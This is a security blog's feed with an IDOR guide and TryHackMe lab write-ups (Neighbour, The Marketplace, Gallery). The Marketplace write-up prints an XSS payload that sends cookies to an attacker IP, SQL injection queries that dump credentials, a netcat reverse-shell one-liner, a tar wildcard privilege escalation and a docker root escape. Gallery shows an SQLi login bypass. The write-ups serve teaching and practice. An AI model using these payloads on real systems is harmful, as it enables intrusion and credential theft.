<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-06-30T17:26:31+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido‚Äôs Blog</title><subtitle>This is my personal website. The purpose of the Website is to assist and monitor my own development.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><entry><title type="html">Insecure Direct Object References (IDOR) Guide</title><link href="http://localhost:4000/insecure-direct-object-references-idor-guide/" rel="alternate" type="text/html" title="Insecure Direct Object References (IDOR) Guide" /><published>2023-06-30T00:00:00+03:00</published><updated>2023-06-30T00:00:00+03:00</updated><id>http://localhost:4000/insecure-direct-object-references-idor-guide</id><content type="html" xml:base="http://localhost:4000/insecure-direct-object-references-idor-guide/"><![CDATA[<p>In this article, I will explain <code class="language-plaintext highlighter-rouge">Insecure Direct Object References (IDOR)</code> as best I can.</p>

<p>I shared many <a href="#sources">resources</a> and <a href="#labs">labs</a> in this article, check them out.</p>

<p>I hope the article is useful to you.</p>

<h3 id="topics">Topics</h3>

<ul>
  <li><a href="#idor">IDOR</a> <br /></li>
  <li><a href="#sources">IDOR Sources</a> <br /></li>
  <li><a href="#labs">IDOR Labs</a> <br /></li>
</ul>

<p><br /></p>

<p><img src="/assets/video/idor-guide/idor.png" alt="sqli" /></p>

<h3 id="idor">What is an IDOR?</h3>

<p><code class="language-plaintext highlighter-rouge">IDOR</code> is a vulnerability that allows an attacker to get unauthorized access and perform actions on the target web application.</p>

<p>There are functions in a Web application that users can run from their accounts. For example, the profile editing function.</p>

<p>Profile editing function is a simple function that each user can run from their account. An authorization check should be done in this function to avoid IDOR vulnerability. For example, when a user with <code class="language-plaintext highlighter-rouge">id=10</code> wants to use this function, the web application should check if this action belongs to the user with id=10. If not, the user can do this on different ids. This user can access and edit profiles of different ids without authorization. <code class="language-plaintext highlighter-rouge">This is IDOR</code>.</p>

<p>IDOR is a <code class="language-plaintext highlighter-rouge">dangerous and critical</code> vulnerability. Although a common vulnerability, it can be <code class="language-plaintext highlighter-rouge">much more complex and hard to detect</code>. The reason for this web applications get more complex as they grow. These complications lead to increased vulnerability. And because of these complications, it is difficult to detect the vulnerability.</p>

<p>Let‚Äôs continue with an example from web security academy.</p>

<p><br /></p>

<video width="640" height="360" controls="">
  <source src="/assets/video/idor-guide/IDOR.mp4" type="video/mp4" />
</video>

<p><br /></p>

<h3 id="sources">IDOR Sources</h3>

<ul>
  <li><a href="https://www.youtube.com/watch?v=rloqMGcPMkI">PwnFuction (Video) - Insecure Direct Object Reference (IDOR) Explained</a></li>
  <li><a href="https://www.youtube.com/watch?v=gINAtzdccts">InsiderPhD (Video) - Finding Your First Bug: Manual IDOR Hunting)</a></li>
  <li><a href="https://www.youtube.com/watch?v=3K1-a7dnA60&amp;t=260s">ST√ñK (Video) - Burp Suite tutorial: IDOR vulnerability automation using Autorize and AutoRepeater (bug bounty)</a></li>
  <li><a href="https://youtu.be/TsJ2XPuGe1k">Mehmet D.INCE (Video) - Web Security 101 0x02, IDOR Insecure Direct Object Reference Zafiyetleri Hakkƒ±nda Her ≈üey</a></li>
  <li><a href="https://portswigger.net/web-security/access-control/idor">Web Security Academy - IDOR</a></li>
  <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References">OWASP - IDOR</a></li>
  <li><a href="https://blog.intigriti.com/hackademy/idor/">Intigriti - IDOR</a></li>
  <li><a href="https://www.bugcrowd.com/blog/how-to-find-idor-insecure-direct-object-reference-vulnerabilities-for-large-bounty-rewards/">Bugcrowd - How-To: Find IDOR Vulnerabilities for Large Bounty Rewards</a></li>
  <li><a href="https://medium.com/@aysebilgegunduz/everything-you-need-to-know-about-idor-insecure-direct-object-references-375f83e03a87">Ay≈üe Bilgi G√ºnd√ºz - Everything You Need to Know About IDOR</a></li>
  <li><a href="https://www.geeksforgeeks.org/insecure-direct-object-reference-idor-vulnerability/?ref=gcse">Geeksforgeeks - IDOR</a></li>
  <li><a href="https://book.hacktricks.xyz/pentesting-web/idor">HackTricks - IDOR</a></li>
  <li><a href="https://www.secjuice.com/idor-insecure-direct-object-reference-definition/">Secjuice - IDOR </a></li>
  <li><a href="https://thehackerish.com/idor-tutorial-hands-on-owasp-top-10-training/">Thehackerish - IDOR Tutorial</a></li>
  <li><a href="https://medium.com/cyberverse/automating-burp-to-find-idors-2b3dbe9fa0b8">Aditya Soni - Automating BURP to find IDORs</a></li>
  <li><a href="https://cyberweapons.medium.com/idor-is-everywhere-you-need-to-find-them-3ed12435c9de">ProfessorXSS - IDOR is Everywhere üòÅ You need to find them</a></li>
  <li><a href="https://medium.com/@gonzalocarrascosec/fuzzing-idor-admin-takeover-5343bb8f436e">Gonzalo Carrasco - Fuzzing + IDOR = Admin TakeOver</a></li>
  <li><a href="https://infosecwriteups.com/all-about-getting-first-bounty-with-idor-849db2828c8">Mukul Trivedi (M0hn1sh) - All About Getting First Bounty with IDOR</a></li>
  <li><a href="https://medium.com/@swapmaurya20/a-simple-idor-to-account-takeover-88b8a1d2ec24">Swapmaurya - A Simple IDOR to Account Takeover</a></li>
  <li><a href="https://aseem-shrey.medium.com/attention-to-details-a-curious-case-of-multiple-idors-5a4417ba8848">Aseem Shrey - Attention to Details : Finding Hidden IDORs</a></li>
  <li><a href="https://vickieli.medium.com/intro-to-idor-9048453a3e5d">Vickie Li - Intro to IDOR</a></li>
  <li><a href="https://betterprogramming.pub/all-about-idor-attacks-64c4203b518e">Vickie Li - All About IDOR Attacks</a></li>
  <li><a href="https://vickieli.medium.com/how-to-find-more-idors-ae2db67c9489">Vickie Li - How to find more IDORs</a></li>
  <li><a href="https://sagarsajeev.medium.com/business-logic-vulnerability-via-idor-6d510f1caea9">Sagar Sajeev - Business Logic Vulnerability via IDOR</a></li>
  <li><a href="https://shahjerry33.medium.com/idor-inside-the-session-storage-88af485fc899">Jerry Shah (Jerry) - IDOR - Inside the Session Storage</a></li>
  <li><a href="https://medium.com/techiepedia/an-bug-bounty-hunters-guide-to-idor-vulnerabilities-27012bbccd7">Daniel Hunt - A Bug Bounty Hunter‚Äôs Guide to IDOR Vulnerabilities</a></li>
  <li><a href="https://thegrayarea.tech/bug-hunting-101-idors-for-beginners-40a43f7055ea">Graham Zemel - Bug Hunting 101: IDORs for Beginners</a></li>
  <li><a href="https://junoonbro.medium.com/idors-how-to-find-idors-in-ecommerce-sites-d112bd946fcf">JunoonBro - \(\) IDOR‚Äôs ‚Äî How to find IDORs in Ecommerce sites?</a></li>
  <li><a href="https://medium.com/@swapmaurya20/3-step-idor-in-hackerresume-a365f2632996">Swapmaurya - 3 Step IDOR in HackerResume</a></li>
  <li><a href="https://infosecwriteups.com/what-is-idor-vulnerability-and-how-does-it-affect-you-85431d10f8fb">c0d3x27 - What is IDOR Vulnerability, and how does it affect you?</a></li>
  <li><a href="https://thexssrat.medium.com/idors-what-are-they-and-how-do-you-test-for-them-885c9df4af36">Thexssrat - IDORs: What are they and how do you test for them?</a></li>
  <li><a href="https://ms-official5878.medium.com/insecure-direct-object-reference-6cbe6dc2f47e">Mohammad Mohsin - Insecure Direct object Reference</a></li>
  <li><a href="https://sapt.medium.com/insecure-direct-object-reference-cyber-sapiens-internship-task-18-986a5824c797">Prajit Sindhkar - Insecure Direct Object Reference</a></li>
  <li><a href="https://medium.com/@nynan/what-i-learnt-from-reading-220-idor-bug-reports-6efbea44db7">nynan - What I learnt from reading 220* IDOR bug reports.</a></li>
  <li><a href="https://ozguralp.medium.com/a-less-known-attack-vector-second-order-idor-attacks-14468009781a">Ozgur Alp - A Less Known Attack Vector, Second Order IDOR Attacks</a></li>
  <li><a href="https://medium.com/@jedus0r/idor-insecure-direct-object-references-my-first-p1-in-bugbounty-fb01f50e25df">jedus0r - IDOR ‚ÄúInsecure direct object references‚Äù, my first P1 in Bugbounty</a></li>
  <li><a href="https://infosecwriteups.com/leveraging-burp-suite-extension-for-finding-idor-insecure-direct-object-reference-2653f9b89fd4">Dhanush - Leveraging Burp Suite extension for finding IDOR(Insecure Direct Object Reference).</a></li>
  <li><a href="https://medium.com/@Steiner254/insecure-direct-object-references-idor-16bf0b981b90">Steiner254 - Insecure Direct Object References (IDOR)</a></li>
  <li><a href="https://medium.com/@sathvika03/insecure-direct-object-reference-2506ecd37a83">Sathvika - Insecure Direct Object Reference</a></li>
  <li><a href="https://shellmates.medium.com/insecure-direct-object-references-idor-vulnerability-aa48ad99b8c8">Shellmates Club - Insecure direct object references (IDOR) vulnerability</a></li>
  <li><a href="https://chetan-conikee.medium.com/insecure-direct-object-reference-c33bb851da05">Chetan Conikee - Insecure Direct Object Reference</a></li>
</ul>

<p><br /></p>

<h3 id="labs">IDOR Labs</h3>

<ul>
  <li><a href="https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references">Web Security Academy - Lab: Insecure direct object references</a></li>
  <li><a href="https://tryhackme.com/room/introwebapplicationsecurity">TryHackMe - Web Application Security</a></li>
  <li><a href="https://tryhackme.com/room/corridor">TryHackMe - Corridor</a></li>
  <li><a href="https://tryhackme.com/room/neighbour">TryHackMe - Neighbour</a> - <a href="https://mr0wido.github.io/tryhackme-neighbour/">My Writeup :punch:</a></li>
</ul>

<p><br />
<br />
I hope you liked my article. See you in my other articles:hand:</p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="Guide" /><category term="idor, idor guide" /><summary type="html"><![CDATA[In this article, I will explain Insecure Direct Object References (IDOR) as best I can.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/idor1.png" /><media:content medium="image" url="http://localhost:4000/assets/img/idor1.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Neighbour</title><link href="http://localhost:4000/tryhackme-neighbour/" rel="alternate" type="text/html" title="TryHackMe - Neighbour" /><published>2023-06-30T00:00:00+03:00</published><updated>2023-06-30T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-neighbour</id><content type="html" xml:base="http://localhost:4000/tryhackme-neighbour/"><![CDATA[<p>Check out our new cloud service, Authentication Anywhere. Can you find other user‚Äôs secrets?</p>

<p>Users can enter their username and password, for a totally secure login process! You definitely wouldn‚Äôt be able to find any secrets that other people have in their profile, right?</p>

<p>Access this challenge by deploying both the vulnerable machine by pressing the green ‚ÄúStart Machine‚Äù button located within this task, and the TryHackMe AttackBox by pressing the  ‚ÄúStart AttackBox‚Äù button located at the top-right of the page.</p>

<p>Navigate to the following URL using the AttackBox: http://MACHINE_IP</p>

<p>Check out similar content on TryHackMe:</p>

<ul>
  <li><a href="https://tryhackme.com/room/idor">IDOR</a></li>
</ul>

<p><br /></p>

<h3 id="1-find-the-flag-on-your-neighbors-logged-in-page">1. Find the flag on your neighbor‚Äôs logged in page!</h3>

<p>Let‚Äôs visit the website.</p>

<p>Here is a login page.</p>

<p><img src="/assets/img/tryhackme/neighbour/login.png" alt="login" /></p>

<p>The login page says you can log in as a guest. So let‚Äôs do <code class="language-plaintext highlighter-rouge">CTRL+U</code>.</p>

<p><img src="/assets/img/tryhackme/neighbour/guest.png" alt="guest" /></p>

<p>So, we can log in as <code class="language-plaintext highlighter-rouge">guest:guest</code>. Let‚Äôs log in.</p>

<p><img src="/assets/img/tryhackme/neighbour/guest-login.png" alt="guest-login" /></p>

<p>Yes, we are successfully login.</p>

<p><img src="/assets/img/tryhackme/neighbour/in.png" alt="in" /></p>

<p>Now, we must look at the <code class="language-plaintext highlighter-rouge">URL</code>.</p>

<p><img src="/assets/img/tryhackme/neighbour/url.png" alt="url" /></p>

<p>Let‚Äôs change the URL to this: <code class="language-plaintext highlighter-rouge">?user=admin</code>.</p>

<p>Huh! It was so easy. We are now an admin.</p>

<p><img src="/assets/img/tryhackme/neighbour/admin.png" alt="admin" /></p>

<p><br /></p>

<p>It was nice CTF. I hope you learned something and had fun. But that‚Äôs it for now till next time take care :wave:</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="web, idor, authentication" /><summary type="html"><![CDATA[Check out our new cloud service, Authentication Anywhere. Can you find other user‚Äôs secrets?]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/neighbour.png" /><media:content medium="image" url="http://localhost:4000/assets/img/neighbour.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - The Marketplace</title><link href="http://localhost:4000/tryhackme-the-marketplace/" rel="alternate" type="text/html" title="TryHackMe - The Marketplace" /><published>2023-05-11T00:00:00+03:00</published><updated>2023-05-11T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-the-marketplace</id><content type="html" xml:base="http://localhost:4000/tryhackme-the-marketplace/"><![CDATA[<p>Can you take over The Marketplace‚Äôs infrastructure?</p>

<p>This is a medium level machine and looking at the tags we will be focusing on web, xss, docker and sqli.</p>

<p>The sysadmin of The Marketplace, Michael, has given you access to an internal server of his, so you can pentest the marketplace platform he and his team has been working on. He said it still has a few bugs he and his team need to iron out.</p>

<p>Can you take advantage of this and will you be able to gain root access on his server?</p>

<p>Created by <a href="https://tryhackme.com/p/jammy">jammy</a></p>

<p><br /></p>

<h3 id="1-what-is-flag-1">1. What is flag 1?</h3>

<p>Let‚Äôs do a <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.171.214
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/marketplace/nmap.png" alt="nmap" /></p>

<p>Three ports are open. These are <code class="language-plaintext highlighter-rouge">22/tcp SSH, 80/tcp HTTP, 32768/tcp HTTP</code></p>

<p>Let‚Äôs visit the website running on <code class="language-plaintext highlighter-rouge">80/tcp</code> port.</p>

<p>Here is a homepage.</p>

<p><img src="/assets/img/tryhackme/marketplace/home.png" alt="home" /></p>

<p>There are also <code class="language-plaintext highlighter-rouge">login</code> and <code class="language-plaintext highlighter-rouge">signup</code> pages.</p>

<p><img src="/assets/img/tryhackme/marketplace/login.png" alt="login" /></p>

<p>I register as <code class="language-plaintext highlighter-rouge">new:new</code> on the sign up page.</p>

<p><img src="/assets/img/tryhackme/marketplace/signup.png" alt="signup" /></p>

<p>After that, when I log in, two new pages appear.</p>

<p><img src="/assets/img/tryhackme/marketplace/new-pages.png" alt="new-pages" /></p>

<p>Let‚Äôs go to the <code class="language-plaintext highlighter-rouge">new-listing</code> page.</p>

<p><img src="/assets/img/tryhackme/marketplace/new-listing.png" alt="new-listing" /></p>

<p>I can write something on this page and upload it to the system. As far as I understand, what I write is directly saved in the database. So maybe we can access the database from here.</p>

<p>The message page is as follows.</p>

<p><img src="/assets/img/tryhackme/marketplace/messages.png" alt="messages" /></p>

<p>I‚Äôm checking the <code class="language-plaintext highlighter-rouge">robots.txt</code> page.</p>

<p><img src="/assets/img/tryhackme/marketplace/robots.png" alt="robots" /></p>

<p>I see the <code class="language-plaintext highlighter-rouge">/admin</code> page is accessible.</p>

<p>Let‚Äôs go to the admin page.</p>

<p><img src="/assets/img/tryhackme/marketplace/admin-error.png" alt="admin-error" /></p>

<p>I ran a <code class="language-plaintext highlighter-rouge">gobuster</code> scan at this point, but nothing useful came up. I tried <code class="language-plaintext highlighter-rouge">SQLi</code> using <code class="language-plaintext highlighter-rouge">sqlmap</code> on the login page, but it didn‚Äôt work either.</p>

<p>Then I decided to try <code class="language-plaintext highlighter-rouge">XSS</code> on the <code class="language-plaintext highlighter-rouge">New-listing</code> page.</p>

<p><img src="/assets/img/tryhackme/marketplace/xss1.png" alt="xss1" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ &lt;script&gt;alert('Mr0Wido')&lt;/script&gt;
</code></pre></div></div>

<p>Yes, it did work.</p>

<p><img src="/assets/img/tryhackme/marketplace/xss2.png" alt="xss2" /></p>

<p>There seems to be an <code class="language-plaintext highlighter-rouge">XSS vulnerability</code>. And maybe with the XSS vulnerability, we can access the cookies of the admin user.</p>

<p>But I still have doubts about how to do this somehow the admin user needs to interact.</p>

<p>I‚Äôve been wandering around the site a little more and this catches my attention.</p>

<p><img src="/assets/img/tryhackme/marketplace/report.png" alt="report" /></p>

<p>In other words, we can report the list we created to the admin. So The admin will review the report we sent and click on the payload that we will upload. This means that we may have the cookies of the admin user.</p>

<p>Let ‚Äòs do it.</p>

<p>So ƒ± found this GitHub repository for stealing cookies. <a href="https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md">Steal Cookies with Reflected XSS</a>. <strong><code class="language-plaintext highlighter-rouge">(It's don't working.)</code></strong></p>

<p>The page says there is a python script that steals cookies, we need to run it first. <a href="https://github.com/lnxg33k/misc/blob/master/XSS-cookie-stealer.py">lnxg33k‚Äôs cookie stealer script</a></p>

<p>Then our payload code is as follows:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;
alert(document.cookie);
var i=new Image;
i.src="http://&lt;your-ip&gt;:8888/?"+document.cookie;
&lt;/script&gt;
</code></pre></div></div>

<p>The python script above didn‚Äôt work for me and I edited the script again. <a href="https://github.com/Mr0Wido/xss-cookie-stealer-python-script">Reformed XSS Cookie Stealer Python Script</a>
Let‚Äôs try.</p>

<p>Let‚Äôs run the script first.</p>

<p><img src="/assets/img/tryhackme/marketplace/script1.png" alt="script1" /></p>

<p>Now let‚Äôs <code class="language-plaintext highlighter-rouge">create a New-listing</code>.</p>

<p><img src="/assets/img/tryhackme/marketplace/payload.png" alt="payload" /></p>

<p>The payload we created.</p>

<p><img src="/assets/img/tryhackme/marketplace/report2.png" alt="report2" /></p>

<p>Now let‚Äôs get the admin‚Äôs cookie by reporting the payload we created.</p>

<p><img src="/assets/img/tryhackme/marketplace/report1.png" alt="report1" /></p>

<p><img src="/assets/img/tryhackme/marketplace/messages.png" alt="messages" /></p>

<p>Yes, it worked.</p>

<p><img src="/assets/img/tryhackme/marketplace/script2.png" alt="script2" /></p>

<p>The top token is for my user and the bottom is for the admin user.</p>

<p>Let‚Äôs go to the site and exchange it for our own token.</p>

<p>For <code class="language-plaintext highlighter-rouge">Firefox</code>, we will change the cookie part in <code class="language-plaintext highlighter-rouge">Right-click &gt; Inspect &gt; Storage</code>.</p>

<p><img src="/assets/img/tryhackme/marketplace/change.png" alt="change" /></p>

<p>And when we <code class="language-plaintext highlighter-rouge">refresh the page</code>, we can now <code class="language-plaintext highlighter-rouge">access the admin</code>.</p>

<p><img src="/assets/img/tryhackme/marketplace/admin.png" alt="admin" /></p>

<p>As you will see here, there are some users and their ids.</p>

<p><code class="language-plaintext highlighter-rouge">1:system - 2:michael - 3:jake</code></p>

<p>Others are users that I created. I‚Äôm working a little messy :grin:</p>

<p><br /></p>

<h3 id="2-what-is-flag-2-usertxt">2. What is flag 2? (User.txt)</h3>

<p>It‚Äôs obvious that there is an <code class="language-plaintext highlighter-rouge">SQLi vulnerability</code> here, but let‚Äôs verify it anyway.</p>

<p>I click on <code class="language-plaintext highlighter-rouge">Michael</code> whose id is 2 and write <code class="language-plaintext highlighter-rouge">2-1</code> instead of user=2 in the URL.</p>

<p><img src="/assets/img/tryhackme/marketplace/detect.png" alt="detect" /></p>

<p>And as you can see it returned to the system user with id 1.</p>

<p>We have confirmed the existence of the SQLi vulnerability.</p>

<p>To find out the number of columns, I proceed as follows, increasing one at a time.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,2,3,4,5--
</code></pre></div></div>

<p>When I get to the last 5, I get the following error.</p>

<p><img src="/assets/img/tryhackme/marketplace/error_column.png" alt="error_column" /></p>

<p>So we can go up to 4.</p>

<p>Let‚Äôs get the information from the database.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(schema_name),3,4 FROM information_scheam.schemata-- 
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/marketplace/schemata.png" alt="schemata" /></p>

<p>I continue from the <code class="language-plaintext highlighter-rouge">marketplace</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(table_name),3,4 FROM information_scheam.tables WHERE table_schema='marketplace'-- 
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/marketplace/tables.png" alt="tables" /></p>

<p>There are two important tables, one is <code class="language-plaintext highlighter-rouge">messages</code> and the other is <code class="language-plaintext highlighter-rouge">users</code>.
First I look at the <code class="language-plaintext highlighter-rouge">messages table</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(column_name),3,4 FROM information_scheam.columns WHERE table_name='messages'-- 
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/marketplace/column-messages.png" alt="column-messages" /></p>

<p>Let‚Äôs dump the <code class="language-plaintext highlighter-rouge">contents of the messages</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(id,'~~',message_content,'~~',user_from,'~~',user_to),3,4 FROM messages-- 
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/marketplace/content-messages.png" alt="content-messages" /></p>

<p>It seems that the user whose id is 1, is the system. The system sent a message to Jake, and the <code class="language-plaintext highlighter-rouge">message includes Jake's ssh password</code>. Let‚Äôs keep this information in our pocket now. And let‚Äôs go to the users table.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(column_name),3,4 FROM information_scheam.columns WHERE table_name='users'-- 
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/marketplace/users.png" alt="users" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(id,'~',username,'~',password),3,4 FROM users-- 
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/marketplace/passwords.png" alt="passwords" /></p>

<p>I can try to crack these passwords, but first I want to check if the password I found for Jake works. If it doesn‚Äôt work, we continue from here.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh jake@10.10.171.214
</code></pre></div></div>

<p>Yes it worked. We are inside.</p>

<p><img src="/assets/img/tryhackme/marketplace/jake.png" alt="jake" /></p>

<p>Let‚Äôs get the <code class="language-plaintext highlighter-rouge">user flag</code>.</p>

<p><img src="/assets/img/tryhackme/marketplace/user-flag.png" alt="user-flag" /></p>

<p><br /></p>

<h3 id="3-what-is-flag-3-roottxt">3. What is flag 3? (Root.txt)</h3>

<p>Let‚Äôs try the <code class="language-plaintext highlighter-rouge">sudo -l</code> command.</p>

<p>And ther it is.</p>

<p><img src="/assets/img/tryhackme/marketplace/sduol.png" alt="sduol" /></p>

<p>We can run <code class="language-plaintext highlighter-rouge">/opt/backups/backup.sh</code> as Michael. Without requiring a password.</p>

<p>Let‚Äôs see what‚Äôs in it.</p>

<p><img src="/assets/img/tryhackme/marketplace/backup-sh.png" alt="backup-sh" /></p>

<p>I couldn‚Äôt find how to upgrade permissions. When I started researching, I found a way. Let‚Äôs try.</p>

<p>First I go to <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentestmonkey Reverse Shell Cheat Sheet</a>. And for netcat, I choose:</p>

<p><img src="/assets/img/tryhackme/marketplace/nc.png" alt="nc" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f
</code></pre></div></div>

<p>Now I‚Äôm setting up a <code class="language-plaintext highlighter-rouge">netcat</code> listener on my own machine.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nlvp 5555
</code></pre></div></div>

<p>Then I run the following codes in order.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cd /opt/backups
$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.86.168 5555 &gt;/tmp/f" &gt; shell.sh
$ echo "" &gt; "--checkpoint-action=exec=sh shell.sh"
$ echo "" &gt; --checkpoint=1
$ chmod 777 backup.tar shell.sh
$ sudo -u michael ./backup.sh
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/marketplace/backups.png" alt="backups" /></p>

<p>And we‚Äôre in.</p>

<p><img src="/assets/img/tryhackme/marketplace/michael-in.png" alt="michael-in" /></p>

<p>HUH! <code class="language-plaintext highlighter-rouge">999(docker)</code>. It‚Äôs interesting.</p>

<p>I‚Äôm looking at <a href="https://gtfobins.github.io/gtfobins/docker/">GTFOBins</a> to see if I can find anything about docker.</p>

<p>Let‚Äôs try this.</p>

<p><img src="/assets/img/tryhackme/marketplace/gtf.png" alt="gtf" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -c 'import pty; pty.spawn("/bin/bash")'
$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
</code></pre></div></div>

<p>And we are <code class="language-plaintext highlighter-rouge">root</code>.</p>

<p><img src="/assets/img/tryhackme/marketplace/rootin.png" alt="rootin" /></p>

<p>Let‚Äôs get the <code class="language-plaintext highlighter-rouge">root flag</code>.</p>

<p><img src="/assets/img/tryhackme/marketplace/root-flag.png" alt="root-flag" /></p>

<p><br /></p>

<p>It was nice CTF. I hope you learned something and had fun. But that‚Äôs it for now till next time take care :wave:</p>

<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>mr0wido@protonmail.com</email></author><category term="TryHackMe" /><category term="sqli, xss, docker" /><summary type="html"><![CDATA[Can you take over The Marketplace‚Äôs infrastructure?]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/marketplace.png" /><media:content medium="image" url="http://localhost:4000/assets/img/marketplace.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe - Gallery</title><link href="http://localhost:4000/tryhackme-gallery/" rel="alternate" type="text/html" title="TryHackMe - Gallery" /><published>2023-05-10T00:00:00+03:00</published><updated>2023-05-10T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-gallery</id><content type="html" xml:base="http://localhost:4000/tryhackme-gallery/"><![CDATA[<p>Try to exploit our image gallery system.</p>

<p><br /></p>

<h2 id="1-deploy-and-get-a-shell">1. Deploy and get a Shell</h2>

<p>Our gallery is not very well secured.</p>

<p>Designed and created by <a href="https://twitter.com/mika_sec">Mikaa</a>!</p>

<p><br /></p>

<h3 id="11-how-many-ports-are-open">1.1 How many ports are open?</h3>

<p>Let‚Äôs do a <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.35.177
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/gallery/nmap.png" alt="nmap" /></p>

<p>Two ports are open. These are <code class="language-plaintext highlighter-rouge">80/tcp HTTP, 8080/tcp HTTP</code></p>

<p><strong><code class="language-plaintext highlighter-rouge">Answer : 2</code></strong></p>

<p><br /></p>

<h3 id="12-whats-the-name-of-the-cms">1.2 What‚Äôs the name of the CMS?</h3>

<p>Let‚Äôs visit the website running on <code class="language-plaintext highlighter-rouge">80/tcp</code> port.</p>

<p>An <code class="language-plaintext highlighter-rouge">Apache2 default</code> page appears.</p>

<p>Let‚Äôs look at the websie runining on <code class="language-plaintext highlighter-rouge">8080/tcp</code> port.</p>

<p>A login page appears.</p>

<p><img src="/assets/img/tryhackme/gallery/login.png" alt="login" /></p>

<p><strong><code class="language-plaintext highlighter-rouge">Answer : Simple Image Gallery</code></strong></p>

<p><br /></p>

<h3 id="13-whats-the-hash-password-of-the-admin-user">1.3 What‚Äôs the hash password of the admin user?</h3>

<p>The Website is using <code class="language-plaintext highlighter-rouge">Simple image gallery</code>. I‚Äôm looking to see if I can find anything in <a href="https://www.exploit-db.com">exploit-db</a>.</p>

<p>I found four results in <code class="language-plaintext highlighter-rouge">exploit-db</code>.</p>

<p>I‚Äôm going through the first and second results, separately.</p>

<p>First <a href="https://www.exploit-db.com/exploits/50214">Simple Image Gallery 1.0 - Remote Code Execution</a></p>

<p><img src="/assets/img/tryhackme/gallery/rce1.png" alt="rce1" /></p>

<p>I tried downloading and running the exploit first, but it didn‚Äôt work.</p>

<p>When I looked through the code, I saw this.</p>

<p><img src="/assets/img/tryhackme/gallery/rce2.png" alt="rce2" /></p>

<p>It seems we can access the admin login with SQLi.</p>

<p>We need to write this to the username; <code class="language-plaintext highlighter-rouge">admin' or '1'='1'#</code></p>

<p>Let‚Äôs try.</p>

<p><img src="/assets/img/tryhackme/gallery/rce3.png" alt="rce3" /></p>

<p>Yes it works.</p>

<p><img src="/assets/img/tryhackme/gallery/home.png" alt="home" /></p>

<p>We were able to log in to the site as an admin. I‚Äôve been browsing the site for a bit, let‚Äôs see what I can find.</p>

<p>It seems we can upload files. Maybe we can upload a reverse shell.</p>

<p>But first, I want to examine the other page in exploit-db.
<a href="https://www.exploit-db.com/exploits/50198">Simple Image Gallery System 1.0 - ‚Äòid‚Äô SQL Injection</a></p>

